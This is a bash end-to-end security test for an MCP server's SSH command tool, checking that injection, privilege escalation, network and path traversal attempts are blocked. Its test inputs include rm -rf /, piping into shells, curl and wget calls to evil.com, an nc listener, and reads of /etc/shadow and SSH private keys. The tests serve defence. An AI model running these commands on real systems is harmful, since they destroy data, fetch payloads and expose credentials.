#!/bin/bash
# test_security_e2e.sh - End-to-End Security Tests
#
# These tests verify that security controls work in production.
# ALL attack scenarios MUST BE BLOCKED for the system to be secure.
#
# Requires: SSH_HOST, SSH_USER, PASSWORD environment variables
#
# Usage: ./test_security_e2e.sh

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/mcp_client.sh"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0
CRITICAL_FAIL=0

# Check prerequisites
check_prereqs() {
    if [ -z "$SSH_HOST" ] || [ -z "$PASSWORD" ]; then
        echo -e "${RED}ERROR: SSH_HOST and PASSWORD must be set${NC}"
        exit 1
    fi

    SSH_USER="${SSH_USER:-$USER}"

    # Check server
    if ! mcp_health > /dev/null 2>&1; then
        echo -e "${YELLOW}Starting MCP server...${NC}"
        cd "$SCRIPT_DIR/../.."
        ./server.tcl --port "${MCP_PORT:-3000}" &
        MCP_PID=$!
        trap "kill $MCP_PID 2>/dev/null" EXIT
        sleep 2
    fi
}

# Assert that a command was blocked (security check passed)
expect_blocked() {
    local name="$1"
    local response="$2"

    if has_error "$response"; then
        echo -e "${GREEN}PASS${NC}: $name (correctly blocked)"
        ((PASS++))
    else
        echo -e "${RED}CRITICAL FAIL${NC}: $name (SHOULD BE BLOCKED!)"
        echo "  Response: $response"
        ((FAIL++))
        ((CRITICAL_FAIL++))
    fi
}

# Assert command succeeded
expect_success() {
    local name="$1"
    local response="$2"

    if has_error "$response"; then
        echo -e "${RED}FAIL${NC}: $name"
        echo "  Response: $response"
        ((FAIL++))
    else
        echo -e "${GREEN}PASS${NC}: $name"
        ((PASS++))
    fi
}

#===========================================================================
# SECURITY TESTS - Command Injection Attacks
#===========================================================================

run_command_injection_tests() {
    echo ""
    echo "=== Command Injection Tests ==="
    echo ""

    # rm attacks
    local response
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "rm -rf /tmp/test")
    expect_blocked "rm -rf command" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "rm --recursive /tmp/test")
    expect_blocked "rm --recursive command" "$response"

    # Pipe attacks
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "echo test | sh")
    expect_blocked "pipe to sh" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "echo test | bash")
    expect_blocked "pipe to bash" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "echo test | python")
    expect_blocked "pipe to python" "$response"

    # Command chaining
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "ls; rm -rf /")
    expect_blocked "semicolon chaining" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "ls && rm -rf /")
    expect_blocked "AND chaining" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "ls || rm -rf /")
    expect_blocked "OR chaining" "$response"

    # Command substitution
    response=$(mcp_ssh_run "$SSH_SESSION_ID" 'echo $(id)')
    expect_blocked "dollar-paren substitution" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" 'echo `id`')
    expect_blocked "backtick substitution" "$response"

    # Redirects
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "echo malware > /tmp/evil")
    expect_blocked "redirect output" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "cat < /etc/shadow")
    expect_blocked "redirect input" "$response"
}

#===========================================================================
# SECURITY TESTS - Dangerous Commands
#===========================================================================

run_dangerous_command_tests() {
    echo ""
    echo "=== Dangerous Command Tests ==="
    echo ""

    local response

    # find -exec (can execute arbitrary commands)
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "find /tmp -name '*.txt' -exec cat {} \\;")
    expect_blocked "find -exec" "$response"

    # awk system() (can execute arbitrary commands)
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "awk 'BEGIN{system(\"id\")}'")
    expect_blocked "awk system()" "$response"

    # xargs (can pipe to commands)
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "echo /tmp | xargs ls")
    expect_blocked "xargs" "$response"

    # sed (has e flag for execution)
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "sed 's/a/b/' /etc/hostname")
    expect_blocked "sed" "$response"

    # Full path execution
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "/bin/rm -rf /")
    expect_blocked "full path /bin/rm" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "/usr/bin/python -c 'print(1)'")
    expect_blocked "full path python" "$response"

    # Relative path
    response=$(mcp_ssh_run "$SSH_SESSION_ID" "./malware")
    expect_blocked "relative path execution" "$response"
}

#===========================================================================
# SECURITY TESTS - Network Tools
#===========================================================================

run_network_tool_tests() {
    echo ""
    echo "=== Network Tool Tests ==="
    echo ""

    local response

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "curl http://evil.com")
    expect_blocked "curl" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "wget http://evil.com/shell.sh")
    expect_blocked "wget" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "nc -l 4444")
    expect_blocked "nc listener" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "ssh user@internal-server")
    expect_blocked "ssh pivoting" "$response"
}

#===========================================================================
# SECURITY TESTS - Privilege Escalation
#===========================================================================

run_priv_esc_tests() {
    echo ""
    echo "=== Privilege Escalation Tests ==="
    echo ""

    local response

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "sudo ls")
    expect_blocked "sudo" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "su - root")
    expect_blocked "su" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "chmod 777 /tmp/file")
    expect_blocked "chmod" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "chown root:root /tmp/file")
    expect_blocked "chown" "$response"
}

#===========================================================================
# SECURITY TESTS - Path Traversal
#===========================================================================

run_path_tests() {
    echo ""
    echo "=== Path Traversal Tests ==="
    echo ""

    local response

    # Sensitive file access
    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/etc/shadow")
    expect_blocked "cat /etc/shadow" "$response"

    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/etc/sudoers")
    expect_blocked "cat /etc/sudoers" "$response"

    # SSH keys
    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/root/.ssh/id_rsa")
    expect_blocked "cat root SSH key" "$response"

    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/home/$SSH_USER/.ssh/id_rsa")
    expect_blocked "cat user SSH key" "$response"

    # Path traversal
    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/tmp/../etc/shadow")
    expect_blocked "path traversal to shadow" "$response"

    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/tmp/../../etc/passwd")
    expect_blocked "double traversal" "$response"

    # Disallowed directories
    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/bin/bash")
    expect_blocked "access /bin" "$response"

    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/usr/bin/python")
    expect_blocked "access /usr/bin" "$response"
}

#===========================================================================
# SECURITY TESTS - Allowed Commands (Positive Tests)
#===========================================================================

run_allowed_tests() {
    echo ""
    echo "=== Allowed Commands (Positive Tests) ==="
    echo ""

    local response

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "ls -la /tmp")
    expect_success "ls -la /tmp" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "hostname")
    expect_success "hostname" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "ps aux")
    expect_success "ps aux" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "df -h")
    expect_success "df -h" "$response"

    response=$(mcp_ssh_run "$SSH_SESSION_ID" "uname -a")
    expect_success "uname -a" "$response"

    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/etc/hostname")
    expect_success "cat /etc/hostname" "$response"

    response=$(mcp_ssh_cat_file "$SSH_SESSION_ID" "/etc/os-release")
    expect_success "cat /etc/os-release" "$response"
}

#===========================================================================
# MAIN
#===========================================================================

echo "=============================================="
echo "MCP Server Security E2E Tests"
echo "=============================================="
echo ""
echo -e "${RED}CRITICAL: All attack scenarios MUST be blocked${NC}"
echo ""

check_prereqs

echo "Target: $SSH_USER@$SSH_HOST"
echo ""

# Initialize and connect
echo "Connecting to SSH target..."
mcp_initialize "security-test" "1.0.0" > /dev/null

INSECURE="${INSECURE:-false}"
connect_response=$(mcp_ssh_connect "$SSH_HOST" "$SSH_USER" "$PASSWORD" "$INSECURE")

if has_error "$connect_response"; then
    echo -e "${RED}Failed to connect: $connect_response${NC}"
    exit 1
fi

SSH_SESSION_ID=$(extract_session_id "$connect_response")
echo "Connected (session: $SSH_SESSION_ID)"
echo ""
echo "----------------------------------------------"

# Run test suites
run_command_injection_tests
run_dangerous_command_tests
run_network_tool_tests
run_priv_esc_tests
run_path_tests
run_allowed_tests

# Cleanup
echo ""
echo "----------------------------------------------"
echo "Cleaning up..."
mcp_ssh_disconnect "$SSH_SESSION_ID" > /dev/null 2>&1 || true

# Results
echo ""
echo "=============================================="
echo "Security Test Results"
echo "=============================================="
echo -e "Passed:         ${GREEN}$PASS${NC}"
echo -e "Failed:         ${RED}$FAIL${NC}"
echo -e "Critical Fails: ${RED}$CRITICAL_FAIL${NC}"
echo "=============================================="

if [ $CRITICAL_FAIL -gt 0 ]; then
    echo ""
    echo -e "${RED}CRITICAL: System has security vulnerabilities!${NC}"
    echo "DO NOT deploy this system until all security tests pass."
    exit 1
fi

if [ $FAIL -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}WARNING: Some tests failed (non-critical)${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}All security controls verified.${NC}"
exit 0
